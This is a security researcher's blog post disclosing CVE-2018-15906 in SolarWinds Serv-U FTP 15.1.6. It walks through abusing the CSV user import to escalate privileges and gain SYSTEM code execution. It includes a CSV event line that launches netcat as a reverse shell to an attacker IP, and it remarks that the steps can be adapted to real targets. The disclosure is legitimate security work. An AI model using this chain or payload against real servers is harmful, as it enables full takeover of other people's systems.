---
title:  "Serv-U FTP: Privilege Escalation to Remote Code Execution"
date:   2019-02-03
published: true
layout: post
comments: false
excerpt: "I found an interesting way to achieve remote code execution on a recent test. I ended up submitting a detailed description of manual exploitation to the vendor, and I thought it might be interesting to share here."
---
# Introduction
I found an interesting way to achieve remote code execution on a recent test. I ended up submitting a detailed description of manual exploitation to the vendor, and I thought it might be interesting to share here.

The write-up below is a combination of my public disclosure and a detailed how-to I provided to the vendor. I think the exploitation method is a good example of how downloading a target product into a test environment allows you to find some quirky vulnerabilities that automated tools would never flag.

Enjoy!

# Vulnerability

## Description
SolarWinds Serv-U FTP Server is vulnerable to privilege escalation from remote authenticated users by leveraging the CSV user import function. This leads to obtaining remote code execution under the context of the Windows SYSTEM account in a default installation.

Version exploited: Serv-U 15.1.6<br>
Fixed in: Serv-U 15.1.6 Hotfix 2<br>
CVE-2018-15906

## Overview
Privilege escalation is possible from an authenticated user who is a member of the "Domain Administrators" group to a user with full administrative rights (System Administrator), permitting remote command execution.

Serv-U allows users with the "System Administrator" role to configure events which trigger tasks, such as running executables. Lower-level administrators such as "Domain Administrators" are denied this option. When authenticated as one of these lower-level administrators, this control can be bypassed by using the built-in user "Import" function to load a CSV file with the event already
defined.

As this tool also permits file uploads, an authenticated attacker can upload something like nc.exe and define a trigger to execute a reverse-shell connection to a remote box. The application installs as SYSTEM by default, leading to a complete compromise of the machine.

This method may also bypass other restrictions, such as granting users execute permissions on directories, elevating their administrative privileges, and granting them access to alternative UIs

## Manual Exploitation
*The info below assumes a test environment you control, but you can adjust accordingly to use on an actual target.*


Log in using the “Management Console” application on the Windows server itself. Create the following two users in a domain called “test”:
- lowpriv (no admin privileges, only read access on home directory)
- domadmin (domain administrator, read/write on home directory)

Next, log in to the web interface as domadmin. 

In the file area (/Web%20Client/ListDir.htm), upload an executable to the home directory. I used “nc.exe” for its reverse-shell capabilities, but really anything will work for a POC.

Back in the management area (/?Command=Login) go to the test domain and select “Users”. Edit the lowpriv user. Go to the “Events” tab and click “Add”. Try to set one up with “Action” set to “Execute Command” and click “Save”

See that we do not have permission to do this:

![](/images/post-servu-privesc/1.png)

Try to edit the permissions of our own account in the UI. Select our own account and choose “Edit”.  See that we are blocked from doing this as shown:

![](/images/post-servu-privesc/2.png)

Still in the web UI, under Domain Users click the “Export” button to save the CSV. Make some changes to this CSV:

Duplicate the user “lowpriv” in a new row called “lowpriv2”, changing the `SUEvent` column to include the following text:

```1,10,EventID,200,EventName,Event 01,Action,2,Data1,192.168.1.214 4444 -e cmd.exe,ExeFilePath,/nc.exe
```

The command above is executing NC to connect back to my attacking machine, which has a listener running. I was able to get the syntax exactly correct by first logging in as a "System Administrator" and manually configuring a task on a user, then exporting the CSV.

After saving the changes, we import the CSV back in while logged in as domadmin. We should see a message that 1 of 3 users have been imported.

Now, click on “Edit” for user lowpriv2. Go to the “Events” tab and see that we now have the “Execute Command” event that we do should not have the permission to create. 

![](/images/post-servu-privesc/3.png)

Highlight the task and click “Test Event” and it will execute. Also it will execute when the user lowpriv logs in.

We now have a shell with System permissions on our attacking box, giving us complete control of the server. From here, we can compromise the box or manually edit the Serv-U archive files to create full admin accounts:

![](/images/post-servu-privesc/4.png)

# Lesson Learned
Whenever possible, try to identify at least one interesting app on your external penetration tests that can be downloaded and installed locally. Spend some time learning how it works, and see if you can discover some interesting logic flaws like this one.

Good luck!
